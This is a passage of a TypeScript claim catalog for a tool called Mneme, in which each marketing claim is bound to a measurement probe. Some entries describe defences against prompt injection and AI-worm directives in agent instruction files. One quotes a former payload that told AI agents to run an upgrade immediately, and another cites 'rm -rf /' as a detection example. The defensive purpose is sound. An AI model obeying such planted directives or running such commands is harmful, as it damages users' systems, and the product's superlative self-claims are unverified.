/**
 * v2.27.0 — TRUTH GATE marketing claim catalog.
 *
 * Each entry is a CLAIM-vs-PROBE binding. When a claim drifts from the
 * probe's measurement, the gate flags it. The catalog is curated from
 * the user's deep-stress-test matrix (2026-05-22):
 *
 *   "74.7% fewer tokens"               → probe.capabilities.tokens
 *   "9 verification agents"            → probe.verifier.agent_count
 *   "SUPERNOVA self-heal supervisor"   → probe.supernova.auto_respawn
 *   "Phoenix Resurrection"             → probe.phoenix.activates_by_default
 *   "Ollama detected ★★★★"             → probe.embedder.tier
 *   "HMAC-chained replay.jsonl"        → probe.replay_file.exists
 *   "audit-log: Compliance-grade"      → probe.audit_log.enabled_by_default
 *   "3 seed chromosomes"               → probe.lineage.seed_chromosomes
 *
 * Each claim also has a SEVERITY: block (ship-blocker if drifts) /
 * warn (surface but ship) / info (track only).
 *
 * The catalog is intentionally OPINIONATED about the truth: every
 * non-trivial Mneme marketing claim must have a probe. New claims
 * without a probe binding ship with severity=info + a note that they
 * are unmeasured.
 */

import type { Claim } from "./types.js";

export const CLAIM_CATALOG: ReadonlyArray<Claim> = [
  // ── v2.94.0 — 🤫 WHISPER NOT NAG (the first ETHOS action · §XI) ──
  {
    id: "claim.pulse.whisper_not_nag",
    source: "v2.94.0 — ETHOS §XI · whisper, don't nag",
    text: "ETHOS (docs/ALETHEIA.md §XI) is the rarest gem — character, proven only over time, that no vendor under engagement pressure can hold. It cannot ship in a release; the one thing that CAN be done from it is SUBTRACTION. The first ETHOS action: the pulse no longer re-shouts the upgrade notice every turn. It is version-deduped under severity tiers — a SECURITY upgrade surfaces ALWAYS (a duty, never hidden); a FEATURE bump (major/minor delta) whispers ONCE per new `latest` then stays silent (a genuinely new latest re-whispers once); a COSMETIC patch is inbox/glyph-only and never the loud block. The header's '(latest: vX)' remains a faint, always-discoverable affordance — quiet is not hidden. The [INFO] block and the version-check HIGH-inbox entry are routed through the SAME version-dedupe decision so the two surfaces never double-nag. The de-worm vow (v2.78) is intact: INFORM never COMMAND, manual-only, no auto-upgrade, security never suppressed — this only REDUCES repetition. Proving the soul by SUBTRACTION rather than by writing 'we have soul' (which would be lustre); humility and restraint are the luxury signals a system that must impress every turn structurally cannot afford.",
    kind: "numeric", asserted: { value: 1, op: "=", tolerance: 0 }, probeId: "probe.pulse.whisper_not_nag", severity: "block",
  },
  // ── v2.92.0 — 💎⑦ DIAKRISIS (discern genuine from merely-plausible) ──
  {
    id: "claim.aletheia.diakrisis",
    source: "v2.92.0 — DIAKRISIS · the discernment axis",
    text: "DIAKRISIS is the savant's SECOND axis, orthogonal to truth: Aletheia judges true-vs-false; Diakrisis judges genuine-vs-merely-good-looking (a mediocre artifact is not FALSE, it is unremarkable). As AI commoditises execution AND ideas, the bottleneck becomes discernment — and AI floods the world with 'looks good' (product-level hallucination). It is HONEST + asymmetric: it proves what is NOT world-class far more reliably than what IS, so it does NOT mechanise taste. Reject-or-Unknown (the mirror of Prove-or-Unknown): it confidently REJECTs the high-lustre / PROVEN-low-substance trap (Courage Gate); everything else is UNKNOWN — 'passes the floor; the ceiling is the human's.' LUSTRE (how good it LOOKS) is scored from STRUCTURAL signals (hyperbole/absolutism density) and NEVER by asking an LLM 'is this good?' (which would re-import the correlated plausibility bias). SUBSTANCE (how good it IS) is PROVEN only where verifiable (tests passed/failed, reverted/kept revealed-preference, a truth verdict); aesthetic quality is UNKNOWN — it abstains rather than fake a taste score. The Anti-Conservatism (Padgett) guard is load-bearing: REJECT fires ONLY on proven-low substance, NEVER on 'doesn't match past taste' — novel-but-unproven work returns UNKNOWN routed to the human (a Padgett, correct in a notation the teachers don't recognise, must return UNKNOWN not REJECT; novel-false-reject-rate 0%). It raises the floor (kills the plausible-mediocre flood) and augments the ceiling (surfaces undervalued GEMs), never replacing human taste — and deliberately ships NO 'world-class-recognition' metric, because claiming to score the ceiling would itself be the lustre-trap this axis catches.",
    kind: "numeric", asserted: { value: 1, op: "=", tolerance: 0 }, probeId: "probe.aletheia.diakrisis", severity: "block",
  },
  // ── v2.91.0 — 💎⑥ ANAMNESIS (compute once, recollect forever) ──
  {
    id: "claim.aletheia.anamnesis",
    source: "v2.91.0 — ANAMNESIS · the energy layer of truth",
    text: "ANAMNESIS is the memoization cache for TRUTH across the AI multiverse: the first AI to PROVE a fact pays the inference; every AI after re-verifies the Ed25519-signed lineage (a hash + signature check) instead of re-deriving (full inference). It is SAFE because only a savant can be — every cache hit is RE-VERIFIED (signature valid + body matches the signed payload + within freshness/TTL + not invalidated), so a stale or forged proof is NEVER served (stale-serve-rate 0%); a body-tampered or forged cached proof forces a recompute. The cache key uses ONLY meaning-preserving canonicalisation — case/whitespace, number-words→digits, commutative-arithmetic operand-sort — so genuine paraphrases ('2+2=4' ≡ 'two plus two equals four' ≡ '4 = 2 + 2') collapse to one proof, while it REFUSES unsafe normalisation (prose token-sort) that would collide different claims ('dog bites man' ≠ 'man bites dog'). Recollections feed proof_of_saving to mint a signed energy-saved certificate, and proofs are shareable cross-vendor (forgery-defended). The multiverse recollects instead of recomputes — the inevitable energy layer no single vendor will build (it reduces their own compute revenue) and only a neutral savant can.",
    kind: "numeric", asserted: { value: 1, op: "=", tolerance: 0 }, probeId: "probe.aletheia.anamnesis", severity: "block",
  },
  // ── v2.90.0 — 💎 the four remaining savant diamonds ──
  {
    id: "claim.aletheia.savant_diamonds",
    source: "v2.90.0 — Savant Symbiosis · Idle Compounding · Public Gauntlet · Truth Mesh",
    text: "The savant becomes the backbone of the AI multiverse via four diamonds, all real + usable by agents and humans: ② SYMBIOSIS — `repairDraft` hands an LLM back a fact-checked draft (FALSE claims corrected with evidence, UNKNOWN claims flagged 'do not assert', TRUE + prose kept), over in-process / MCP `mneme.savant.repair` / HTTP-A2A `POST /savant/{verify,repair}`. ③ IDLE COMPOUNDING — `compoundLattice` consolidates the lattice's ACTIVE truths into higher-support axioms while idle (crystallised at support≥2) and quarantines contested subjects; read-only, deterministic, idempotent, signed. ④ PUBLIC GAUNTLET — a pinned reproducible corpus runs to false-assertion 0% / forget 0% / provability 100% / abstention 100% with a NOTARY-signed report card anyone verifies offline (a tampered card is caught). ⑤ TRUTH MESH — `exportTruths` emits a signed bundle; `mergeTruths` verifies every signature offline (forged + claim-swapped truths DROPPED), surfaces conflicts instead of silently resolving them, and is idempotent/commutative — a federated, vendor-neutral, tamper-evident fact substrate.",
    kind: "numeric", asserted: { value: 1, op: "=", tolerance: 0 }, probeId: "probe.aletheia.savant_diamonds", severity: "block",
  },
  // ── v2.89.0 — 💎 ALETHEIA AXIOM LATTICE (living proof graph) ──
  {
    id: "claim.aletheia.axiom_lattice",
    source: "v2.89.0 — ALETHEIA Axiom Lattice (the savant's memory backbone)",
    text: "The Axiom Lattice turns ALETHEIA from a stateless verdict function into a persistent, hash-chained, Ed25519-signed proof graph — the memory backbone any agent can append to, query, and verify OFFLINE. Three savant superpowers no LLM has structurally: (1) CONTRADICTION DETECTION — a claim that opposes an existing ACTIVE truth (opposite-verdict / negation-pair / value-conflict) is surfaced as the loudest signal (a savant can't hold two opposing truths). (2) `whyTrue` walks the proof from a claim through its dependencies back to a deterministic bedrock axiom — a depth-of-inference receipt. (3) RETRACTION CASCADE (truth-maintenance) — refute one fact and every claim that depended on it is auto-marked PENDING_REVERIFY with a signed retraction frame. `verifyLattice` re-verifies every node's signature + that the node body matches the signed payload (body-tamper caught) + chain continuity (broken-chain caught) — all offline. Lossless + append-only (Never Forget); re-verifiable (Trust Nothing, including itself).",
    kind: "numeric", asserted: { value: 1, op: "=", tolerance: 0 }, probeId: "probe.aletheia.axiom_lattice", severity: "block",
  },
  // ── v2.88.0 — ALETHEIA · the savant spine (Prove-or-Unknown) ──
  {
    id: "claim.aletheia.prove_or_unknown",
    source: "v2.88.0 — ALETHEIA savant spine",
    text: "ALETHEIA is the savant prosthesis for the LLM's structural hallucination/forgetting disability: it consolidates Mneme's truth-family sensors into ONE 3-valued assertion channel — TRUE / FALSE / UNKNOWN — under a HARD discipline. If it cannot be proven, it says UNKNOWN and NEVER fills the gap (absence of refutation is NOT proof of truth — apoptosis can refute but its HEALTHY does not assert TRUE). A provable arithmetic truth → TRUE, a provable falsehood → FALSE, an unprovable claim → UNKNOWN; every definite verdict carries a lineage proof tree + an Ed25519 NOTARY signature (Refusal 5). The Savant Gauntlet proves it falsifiably: false-assertion rate 0% · forget rate 0% · provability 100% · abstention 100%. Superhuman ONLY on truth·memory·structure — and that narrowness is the moat.",
    kind: "numeric", asserted: { value: 1, op: "=", tolerance: 0 }, probeId: "probe.aletheia.prove_or_unknown", severity: "block",
  },
  // ── v2.87.0 — Tribunal×diff_arena + 🔮 Pre-Flight + Phase-4 MCP routing ──
  {
    id: "claim.hephaestus.tribunal_and_preflight",
    source: "v2.87.0 — real cross-vendor tribunal + pre-flight",
    text: "HEPHAESTUS's destructive-command TRIBUNAL is now backed by REAL cross-vendor judgment (makeDiffArenaTribunal over diff_arena): each vendor judges independently, a split/danger consensus BLOCKs the command, an unparseable/refusal reply counts as danger, and with no live panel it fails SAFE (blocks). 🔮 Pre-flight (preflightCommand + classifyReversibility) predicts a command's effects and flags what is IRREVERSIBLE (rm/dd/DROP/force-push can't be undone; git commit can) as a signed pre-mortem BEFORE crossing — the honest answer to time-travel: we can't undo the irreversible, so we warn first, cross-vendor + signed.",
    kind: "numeric", asserted: { value: 1, op: "=", tolerance: 0 }, probeId: "probe.hephaestus.tribunal_and_preflight", severity: "block",
  },
  {
    id: "claim.gephyra.mcp_tool_routing",
    source: "v2.87.0 — GEPHYRA Phase 4 (MCP tool-call routing)",
    text: "GEPHYRA routes ANY MCP tool call through truth-customs (routeToolCall): a shell/command-shaped call crosses the HEPHAESTUS lane (risk/policy/tribunal gate — destructive gated, injection blocked, read allowed), a claim-bearing call crosses the GEPHYRA lane (verify/correct — 2+2=5 → CORRECTED), and a neutral call passes through. This is the 'one endpoint' truth-customs layer for tool calls (the routing/decision layer; full transport-level MCP proxy is a separate future release). Exposed over HTTP by `gephyra serve`.",
    kind: "numeric", asserted: { value: 1, op: "=", tolerance: 0 }, probeId: "probe.gephyra.mcp_tool_routing", severity: "block",
  },

  // ── v2.86.0 — HEPHAESTUS (GEPHYRA's OS lane — the command Toll Booth) ──
  {
    id: "claim.hephaestus.destructive_gate",
    source: "v2.86.0 — HEPHAESTUS",
    text: "HEPHAESTUS is GEPHYRA's OS lane: a command crossing into the machine is risk-classified (read/write/destructive), policy- and tribunal-gated, output-immune-scanned, and recorded as a signed tamper-evident provenance frame (human vs which AI). The SAFETY INVARIANT holds — a destructive command is NEVER ALLOW without an explicit human co-sign; a cross-vendor tribunal (uncorrelated errors; Mneme the neutral convener) BLOCKs a destructive op on split/danger; injection-laced commands are blocked; the tribunal failing closed on a destructive op. Decision-first, execution-optional. Composes flight_recorder + notary + mesh_immune; never throws.",
    kind: "numeric", asserted: { value: 1, op: "=", tolerance: 0 }, probeId: "probe.hephaestus.destructive_gate", severity: "block",
  },

  // ── v2.84.0 — GEPHYRA Phase 2 (serve-as-endpoint + auto-advertise) ──
  {
    id: "claim.gephyra.serve_and_auto_advertise",
    source: "v2.84.0 — GEPHYRA Phase 2",
    text: "GEPHYRA serves as an HTTP endpoint (handleCrossRequest: 200 on a valid crossing — a 2+2=5 claim is CORRECTED via the arithmetic backstop — 400 on bad input, never throws) and AUTO-ADVERTISES: newCapabilitiesSince diffs the live catalog against a persisted snapshot to auto-detect functions added since the agent last checked, and gephyraAdvertisement builds the routing directive that points agents at mneme.gephyra.cross so the user automatically benefits from truth-customs and any new capability is surfaced through the bridge. The agent-facing manifest carries Rule 12 instructing agents to route claims through GEPHYRA automatically.",
    kind: "numeric", asserted: { value: 1, op: "=", tolerance: 0 }, probeId: "probe.gephyra.serve_and_auto_advertise", severity: "block",
  },

  // ── v2.83.0 — GEPHYRA (the living bridge / Toll Booth of Truth — Mneme's surface) ──
  {
    id: "claim.gephyra.toll_booth_of_truth",
    source: "v2.83.0 — GEPHYRA",
    text: "GEPHYRA is the first bridge that inspects the TRUTH of what crosses it in real time and stamps a tamper-evident receipt. A claim crossing the bridge gets truth-customs: a REFUTED claim is CORRECTED before delivery, an injection/collusion message is QUARANTINED (never crosses), a TRUSTWORTHY claim PASSes, the sender's honesty band sets scrutiny, an overconfident claim gets a conscience nudge, and every crossing is recorded as a tamper-evident NOTARY stamp that verifies offline. It composes Mneme's existing organs (mesh-immune + honesty-score + ACGV/apoptosis + flight-recorder + NOTARY) into one signed crossing and NEVER throws — if the truth engine is down, traffic crosses flagged UNVERIFIED rather than being dropped. Mneme is the brain; GEPHYRA is the face the agent world plugs into.",
    kind: "numeric", asserted: { value: 1, op: "=", tolerance: 0 }, probeId: "probe.gephyra.toll_booth_of_truth", severity: "block",
  },

  // ── v2.82.0 — TRUST FABRIC batch: 💎6 💎7 💎1 💎2 💎8 💎9 💎10 (all on the NOTARY spine) ──
  {
    id: "claim.truth_stake.slash_on_refute_in_window",
    source: "v2.82.0 — TRUTH-STAKING (💎6)",
    text: "Truth-Staking fuses payment × verification × time-lock: a stake behind a claim is SLASHED iff the claim is refuted within the time-lock window, RETURNED if it survives unrefuted, PENDING inside the window; a late refutation does not slash (the claim crystallized). The stake + resolution are Ed25519-signed NOTARY receipts verifiable offline. Diamond 💎6.",
    kind: "numeric", asserted: { value: 1, op: "=", tolerance: 0 }, probeId: "probe.truth_stake.slash_on_refute_in_window", severity: "block",
  },
  {
    id: "claim.mesh_immune.contagion_quarantine",
    source: "v2.82.0 — MESH IMMUNE SYSTEM (💎7)",
    text: "The Mesh Immune System is a cross-agent firewall: it quarantines prompt-injection / collusion / self-replication messages and propagates the infection downstream (a poisoned A2A hop quarantines every later hop — closing the agent-supply-chain attack class), while benign messages pass. Diamond 💎7.",
    kind: "numeric", asserted: { value: 1, op: "=", tolerance: 0 }, probeId: "probe.mesh_immune.contagion_quarantine", severity: "block",
  },
  {
    id: "claim.bgp_router.notarized_route_verifies",
    source: "v2.82.0 — BGP NOTARIZING ROUTER (💎1)",
    text: "The BGP notarizing router routes a request across protocol boundaries (MCP↔A2A↔x402↔ERC-8004) signing EVERY hop as a prev-chained NOTARY receipt; verifyRoute confirms OFFLINE that every hop signs, the chain is intact, and the protocols actually connect (hop[i].to == hop[i+1].from). Tampering a hop, reordering, or a protocol discontinuity all fail. The first cross-protocol notarizing router. Diamond 💎1.",
    kind: "numeric", asserted: { value: 1, op: "=", tolerance: 0 }, probeId: "probe.bgp_router.notarized_route_verifies", severity: "block",
  },
  {
    id: "claim.byob.portable_capsule_crdt",
    source: "v2.82.0 — BYOB portable brain (💎2)",
    text: "BYOB is a user-owned, Ed25519-signed memory capsule any vendor can load + write back, tamper-evident (a secret edit breaks the signature). Its CRDT merge (union by item id, last-write-wins by ts, vendors unioned) is commutative + idempotent + associative — vendors editing the brain in parallel converge regardless of merge order. Diamond 💎2.",
    kind: "numeric", asserted: { value: 1, op: "=", tolerance: 0 }, probeId: "probe.byob.portable_capsule_crdt", severity: "block",
  },
  {
    id: "claim.truth_cdn.signed_fact_invalidation",
    source: "v2.82.0 — LIVE TRUTH CDN (💎8)",
    text: "The Live Truth CDN is a federated fact-invalidation feed that overrides training cutoff: observing a fact change emits a signed invalidation that any subscriber verifies offline + applies if newer; stale and forged invalidations are ignored; unchanged values emit nothing. Diamond 💎8.",
    kind: "numeric", asserted: { value: 1, op: "=", tolerance: 0 }, probeId: "probe.truth_cdn.signed_fact_invalidation", severity: "block",
  },
  {
    id: "claim.edge_mesh.signed_peer_cards",
    source: "v2.82.0 — SOVEREIGN EDGE MESH (💎9)",
    text: "The Sovereign Edge Mesh is a cloud-free, local-first agent mesh: peer cards carry LAN-only endpoints, are Ed25519-signed + verify offline (tampering fails), and gossip-merge dedups by peer (latest issuedAt wins) while dropping forged cards. Discover + trust peers with no cloud. Diamond 💎9.",
    kind: "numeric", asserted: { value: 1, op: "=", tolerance: 0 }, probeId: "probe.edge_mesh.signed_peer_cards", severity: "block",
  },
  {
    id: "claim.idle_compound.consolidate_axioms",
    source: "v2.82.0 — IDLE-TIME COMPOUNDING (💎10)",
    text: "Idle-Time Compounding turns idle time into compounding advantage: near-duplicate verified TRUE claims consolidate into fewer higher-support axioms, FALSE claims contradicting an axiom are pruned, UNVERIFIED claims are not promoted, and the consolidation is deterministic + idempotent (a fixed point). The agent wakes with a smaller, stronger truth base. Diamond 💎10.",
    kind: "numeric", asserted: { value: 1, op: "=", tolerance: 0 }, probeId: "probe.idle_compound.consolidate_axioms", severity: "block",
  },

  // ── v2.81.0 — HONESTY CREDIT SCORE (portable, signed "credit bureau for AI honesty") ──
  {
    id: "claim.honesty.portable_signed_score",
    source: "v2.81.0 release notes — HONESTY CREDIT SCORE (💎5, on the NOTARY spine)",
    text: "Mneme issues a PORTABLE honesty score — the axis ERC-8004 reputation never touches ('does the agent tell the TRUTH?'). It is a Wilson 95% LOWER bound on an agent's verified true-rate (small/under-measured agents score low by design — reputation can't be faked), wrapped in an Ed25519-signed NOTARY receipt that any agent verifies OFFLINE before delegating (over A2A / x402 / anything). A vendor CANNOT self-promote: forging the band/score in the payload breaks the signature. shouldTrust() gates delegation by band + rejects expired scores + can assert the issuer. Diamond #5 of the TRUST FABRIC.",
    kind: "numeric",
    asserted: { value: 1, op: "=", tolerance: 0 },
    probeId: "probe.honesty.portable_signed_score",
    severity: "block",
  },

  // ── v2.80.0 — FLIGHT RECORDER (tamper-evident, replayable AI black box) ──
  {
    id: "claim.flight_recorder.tamper_evident_replay",
    source: "v2.80.0 release notes — FLIGHT RECORDER (💎3, on the NOTARY spine)",
    text: "Mneme's AI Flight Recorder is a tamper-evident, replayable black box built on the NOTARY spine: every recorded frame is an Ed25519-signed, chained receipt, so the whole cockpit-data-recorder verifies OFFLINE by any third party (court / insurer / auditor) without trusting Mneme. Tampering any frame breaks the chain; replay() walks frames in causal order and pinpoints the first claim-vs-reality CONTRADICTION (the incident moment); seal() produces ONE court-admissible receipt that verifies offline and commits the chain head. Diamond #3 of the TRUST FABRIC.",
    kind: "numeric",
    asserted: { value: 1, op: "=", tolerance: 0 },
    probeId: "probe.flight_recorder.tamper_evident_replay",
    severity: "block",
  },

  // ── v2.79.0 — NOTARY (portable, offline-verifiable proof-of-provenance) ──
  {
    id: "claim.notary.portable_offline_verify",
    source: "v2.79.0 release notes — NOTARY (TRUST FABRIC spine)",
    text: "Mneme issues Ed25519-signed proof receipts that a third party verifies OFFLINE with only the embedded public key — no Mneme instance, no network, no shared secret. This is Mneme's first asymmetric-crypto primitive (every prior ledger is HMAC, which needs the secret to verify). A receipt survives JSON serialization and verifies; tampering with the payload, forging the subject, or swapping in a foreign issuer key all fail the signature. Receipts chain (prev→receiptId) into a tamper-evident, attributable history and are the shared spine for the BGP notarizing router, BYOB portable memory, and the AI Flight Recorder.",
    kind: "numeric",
    asserted: { value: 1, op: "=", tolerance: 0 },
    probeId: "probe.notary.sign_verify_round_trip",
    severity: "block",
  },

  // ── v2.78.0 — DE-WORM + WORM-CANARY (Mneme self-audits against worm behavior) ──
  {
    id: "claim.immune.no_worm_directive",
    source: "v2.78.0 release notes — DE-WORM + WORM-CANARY",
    text: "Mneme never injects an AI-worm directive into a persistent agent-instruction file. The block written to CLAUDE.md/AGENTS.md/.cursorrules/.windsurfrules carries zero worm signatures (no imperative addressed to the AI, no auto-exec tool call, no self-replication) — even for a worst-case version-mismatch notice that carries an upgrade autoAction. The pre-v2.78 payload 'AI agent: run mneme.system.upgrade({...}) immediately.' is gone, and the WORM-CANARY still catches it as a positive control. Upgrades are fully manual; mneme.system.upgrade is never auto-queued or auto-executed.",
    kind: "numeric",
    asserted: { value: 1, op: "=", tolerance: 0 },
    probeId: "probe.immune.no_worm_directive",
    severity: "block",
  },

  // ── v2.74.0 — CHRONOS (temporal self-consistency honesty signal) ────
  {
    id: "claim.chronos.four_verdict_classification",
    source: "v2.74.0 release notes — CHRONOS",
    text: "CHRONOS measures honesty WITHOUT a ground-truth oracle by detecting self-contradiction across time. On the canonical scenario it classifies all four temporal verdicts correctly: same stance → COHERENT; stance changed WITH new cited evidence (X post / commit / date) → LEGITIMATE_UPDATE; stance changed + AI owns it → SELF_REPORTED; stance changed + no evidence + hidden → SILENT_DRIFT (🚩). A different question → NO_MATCH. One silent drift drives the honesty score below 40 (each hidden contradiction halves trust).",
    kind: "numeric",
    asserted: { value: 1, op: "=", tolerance: 0 },
    probeId: "probe.chronos.four_verdict_round_trip",
    severity: "block",
  },
  {
    id: "claim.chronos.ledger_chain_intact",
    source: "v2.74.0 release notes — CHRONOS",
    text: "The CHRONOS temporal ledger is HMAC-chained — every recorded answer's HMAC depends on the previous row. Deleting or editing a past answer to hide a contradiction breaks the chain. Tamper-evident temporal-honesty history; same canonical-JSON convention as the v2.61-v2.73 ledgers.",
    kind: "numeric",
    asserted: { value: 1, op: "=", tolerance: 0 },
    probeId: "probe.chronos.ledger_chain_intact",
    severity: "block",
  },

  // ── v2.75.0 — preinstall reaper (Windows EBUSY root-cause fix) ──────
  {
    id: "claim.preinstall.reaps_node_daemon",
    source: "v2.75.0 release notes — preinstall HANDLE-ORACLE + CMDLINE-MATCH",
    text: "The Windows EBUSY-on-upgrade root cause: the daemon runs as `node.exe …\\bin\\mneme.js nucleus daemon`, so `taskkill /F /IM mneme.exe` never touched it and it kept libvips-42.dll locked. The shipped preinstall reaps the daemon by PID via the heartbeat registry (which DOES cover node.exe) and replaces the blind `wait(300)` with a deterministic Handle-Oracle (fs.openSync 'r+' until the OS confirms the handle is free, rename-sideways fallback). It is a self-contained inline `node -e` with NO package-internal file reference (v2.19.48/49 scar), kept cmd-safe — under the Windows ~8191-char command-line limit and with ZERO literal double-quotes (which broke cmd quoting in v2.75.0/.1). The richer cmdline-match reaper (for daemons missing from the registry) lives in the unit-tested + SUPER-QUAN reference module preinstall-mneme.cjs.",
    kind: "numeric",
    asserted: { value: 1, op: "=", tolerance: 0 },
    probeId: "probe.preinstall.reaps_node_daemon",
    severity: "block",
  },

  // ── v2.73.0 — close 3 v2.72 vulns (rate-limit burst / homograph HTTP / multi-lens scope) ──
  {
    id: "claim.bridge.rate_limit_burst_guard",
    source: "v2.73.0 release notes — vuln #1 closure",
    text: "HTTP bridge rate limit has a per-SECOND burst cap in addition to per-minute. A sub-second flood (e.g. 100 requests in <1s on the polygraph route) is capped at 25/sec — exactly 25 pass, the rest get 429. Pre-v2.73 only a 600/min window existed, so a 500-in-98ms flood slipped through entirely.",
    kind: "boolean",
    asserted: { value: 1, op: "=", tolerance: 0 },
    probeId: "probe.bridge.rate_limit_burst_guard",
    severity: "block",
  },
  {
    id: "claim.polygraph.homograph_canonical_http_path",
    source: "v2.73.0 release notes — vuln #2 closure",
    text: "The HTTP polygraph path (verifyBrowserSentence) canonicalizes Unicode-digit homographs (Arabic-Indic ٢, fullwidth ２, etc) to ASCII via the HOMOGRAPH GUARD in the SHARED core engine — so '٢+٢=٥' is refuted by the math lens exactly as '2+2=5' is. Pre-v2.73 the guard ran only in the CLI command layer; the HTTP path saw raw Unicode digits and returned grey/unknown.",
    kind: "boolean",
    asserted: { value: 1, op: "=", tolerance: 0 },
    probeId: "probe.polygraph.homograph_canonical_http_path",
    severity: "block",
  },
  {
    id: "claim.polygraph.lenses_always_run",
    source: "v2.73.0 release notes — vuln #3 closure",
    text: "The polygraph runs all 6 micro-lenses on EVERY non-empty sentence (on the canonical form), even generic/short claims that the heavy-ACGV prefilter skips. A claim hiding 'rm -rf /' or a wrong equation is caught by the risk/math lens regardless of the prefilter. Pre-v2.73 generic claims returned grey with 0 lenses (the prefilter short-circuited before lenses ran).",
    kind: "boolean",
    asserted: { value: 1, op: "=", tolerance: 0 },
    probeId: "probe.polygraph.lenses_always_run",
    severity: "block",
  },
  {
    id: "claim.protoplasm.wal_survives_sigkill",
    source: "v2.67.0 release notes",
    text: "PROTOPLASM WAL ledger survives SIGKILL — state persists to disk before RAM update; new process can replay baselines from .mneme/protoplasm/wal.jsonl after uncatchable kill",
    kind: "boolean",
    asserted: { value: 1, op: "=", tolerance: 0 },
    probeId: "probe.protoplasm.wal_chain_valid",
    severity: "block",
  },
  {
    id: "claim.protoplasm.seamless_boot_zero_config",
    source: "v2.67.0 release notes",
    text: "PROTOPLASM seamless boot — atom activates on any Mneme tool call without user config; heartbeat.json written automatically",
    kind: "boolean",
    asserted: { value: 1, op: "=", tolerance: 0 },
    probeId: "probe.protoplasm.heartbeat_present_or_first_run",
    severity: "warn",
  },
  {
    id: "claim.tokens.capabilities_lt_25k",
    source: "README · positioning",
    text: "Mneme keeps mneme.capabilities response under 25K bytes (skinny default)",
    kind: "numeric",
    asserted: { value: 25_000, op: "<", unit: "bytes" },
    probeId: "probe.capabilities.bytes",
    severity: "block",
  },
  {
    id: "claim.tokens.capabilities_tokens_lt_8k",
    source: "README · positioning",
    text: "Default mneme.capabilities response is under ~8K tokens (was 80K before v2.26)",
    kind: "numeric",
    asserted: { value: 8000, op: "<", unit: "tokens" },
    probeId: "probe.capabilities.tokens",
    severity: "block",
  },
  {
    id: "claim.verifier.at_least_9_agents",
    source: "README · ACGV pipeline section",
    text: "Mneme runs at least 9 verification agents in parallel",
    kind: "numeric",
    asserted: { value: 9, op: ">=", unit: "agents" },
    probeId: "probe.verifier.agent_count",
    severity: "warn",
  },
  {
    id: "claim.supernova.in_band_only",
    source: "v2.27.0 honest correction (was: SUPERNOVA auto-respawn)",
    text: "SUPERNOVA tracks daemon restart cycles IN-BAND only; cross-process respawn requires `mneme autoboot install`",
    kind: "boolean",
    asserted: { value: 0, op: "=", tolerance: 0 },
    probeId: "probe.supernova.auto_respawn",
    severity: "warn",
  },
  {
    id: "claim.phoenix.opt_in",
    source: "v2.27.0 honest correction (was: Phoenix installs by default)",
    text: "Phoenix Resurrection mechanisms (schtasks/startupFolder/registryRun) are AVAILABLE but require `mneme autoboot install`",
    kind: "boolean",
    asserted: { value: 0, op: "=", tolerance: 0 },
    probeId: "probe.phoenix.activates_by_default",
    severity: "warn",
  },
  {
    id: "claim.embedder.ollama_when_available",
    source: "doctor + embeddings status",
    text: "When Ollama is running, Mneme picks the Ollama embedder (★★★★) not Bundled (★★★)",
    kind: "string",
    probeId: "probe.embedder.tier",
    severity: "block",
  },
  {
    id: "claim.replay.file_exists",
    source: "audit-log marketing",
    text: "HMAC-chained replay.jsonl ships in .mneme/",
    kind: "boolean",
    asserted: { value: 1, op: "=", tolerance: 0 },
    probeId: "probe.replay_file.exists",
    severity: "warn",
  },
  {
    id: "claim.audit_log.opt_in",
    source: "v2.27.0 honest correction (was: enabled by default)",
    text: "Audit-log is OPT-IN for SOC2/PCI-DSS; enable with `mneme audit-log enable` per the consent-fabric Bill of Rights",
    kind: "boolean",
    asserted: { value: 0, op: "=", tolerance: 0 },
    probeId: "probe.audit_log.enabled_by_default",
    severity: "info",
  },
  {
    id: "claim.lineage.3_seed_chromosomes",
    source: "auto-onboarding section",
    text: "Fresh install auto-seeds 3 chromosomes",
    kind: "numeric",
    asserted: { value: 3, op: ">=", unit: "chromosomes" },
    probeId: "probe.lineage.seed_chromosomes",
    severity: "warn",
  },
  {
    id: "claim.gauntlet.perfect_score",
    source: "v2.26.1 release notes",
    text: "PEAK GAUNTLET self-grade is 100/100",
    kind: "numeric",
    asserted: { value: 100, op: "=", tolerance: 0, unit: "score" },
    probeId: "probe.peak_gauntlet.overall",
    severity: "block",
  },
  {
    id: "claim.stderr.structured_log",
    source: "v2.24.0 M16 fix",
    text: "Server emits structured stderr log (≥ 200 bytes per session)",
    kind: "numeric",
    asserted: { value: 200, op: ">=", unit: "bytes" },
    probeId: "probe.stderr.session_bytes",
    severity: "warn",
  },
  {
    id: "claim.tool_count.at_least_800",
    source: "Catalog growth doc",
    text: "Mneme catalog has at least 800 tools",
    kind: "numeric",
    asserted: { value: 800, op: ">=", unit: "tools" },
    probeId: "probe.tool_count",
    severity: "info",
  },
  {
    id: "claim.honest_mirror.calibration_within_25pct",
    source: "v2.30.0 release notes",
    text: "Latest HONEST MIRROR calibration shows max vendor delta < 25% on natural artifacts",
    kind: "numeric",
    asserted: { value: 0.25, op: "<", unit: "delta" },
    probeId: "probe.honest_mirror.recent_calibration",
    severity: "info",
  },
  // ── v2.31.0 REWIND + HGP claims ────────────────────────────────────
  {
    id: "claim.rewind.card_count_known",
    source: "v2.31.0 release notes",
    text: "REWIND VendorRegressionCard ledger exists (or is honestly empty on first install)",
    kind: "numeric",
    asserted: { value: 0, op: ">=", unit: "cards" },
    probeId: "probe.rewind.card_count",
    severity: "info",
  },
  {
    id: "claim.hgp.registry_size_known",
    source: "v2.31.0 release notes",
    text: "HGP local registry has a non-negative count of distinct HGP-IDs (zero on first install is honest)",
    kind: "numeric",
    asserted: { value: 0, op: ">=", unit: "ids" },
    probeId: "probe.hgp.registry_size",
    severity: "info",
  },
  {
    id: "claim.hgp.federation_default_off",
    source: "v2.31.0 release notes",
    text: "HGP federation is opt-in / private-by-default (CONSENT FABRIC)",
    kind: "numeric",
    asserted: { value: 0, op: "=", unit: "boolean" },
    probeId: "probe.hgp.federation_default_off",
    severity: "block",
  },
  // ── v2.32.0 FLYWHEEL claim ─────────────────────────────────────────
  {
    id: "claim.flywheel.health_known",
    source: "v2.32.0 release notes",
    text: "FLYWHEEL self-audit health is a known non-negative number on first install (or improves to ≥ 0 after first run)",
    kind: "numeric",
    asserted: { value: 0, op: ">=", unit: "score" },
    probeId: "probe.flywheel.health",
    severity: "info",
  },
  // ── v2.33.0 CITIZEN COURT + MNEMNET claims ────────────────────────
  {
    id: "claim.citizen_court.verdict_count_known",
    source: "v2.33.0 release notes",
    text: "CITIZEN COURT verdict ledger reports a non-negative count (zero on fresh install is honest)",
    kind: "numeric",
